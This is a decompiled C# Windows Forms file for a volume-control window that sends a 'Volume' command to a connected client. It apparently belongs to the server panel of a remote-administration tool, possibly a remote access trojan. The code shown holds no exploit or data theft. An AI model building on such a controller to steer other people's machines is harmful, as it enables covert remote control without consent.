using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x02000099 RID: 153
	public partial class FormVolumeControl : FormMaterial
	{
		// Token: 0x06000420 RID: 1056 RVA: 0x000331C2 File Offset: 0x000313C2
		public FormVolumeControl()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x06000421 RID: 1057 RVA: 0x000331E2 File Offset: 0x000313E2
		private void FormProcess_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
		}

		// Token: 0x06000422 RID: 1058 RVA: 0x0003320C File Offset: 0x0003140C
		private void ChangeScheme(object sender)
		{
		}

		// Token: 0x06000423 RID: 1059 RVA: 0x0003320E File Offset: 0x0003140E
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client != null)
			{
				this.client.Disconnect();
			}
		}

		// Token: 0x06000424 RID: 1060 RVA: 0x00033223 File Offset: 0x00031423
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x06000425 RID: 1061 RVA: 0x00033253 File Offset: 0x00031453
		private void trackBar1_Scroll(object sender, EventArgs e)
		{
			this.client.Send(new object[]
			{
				"Volume",
				this.trackBar1.Value
			});
		}

		// Token: 0x04000277 RID: 631
		public Clients client;

		// Token: 0x04000278 RID: 632
		public Clients parrent;
	}
}
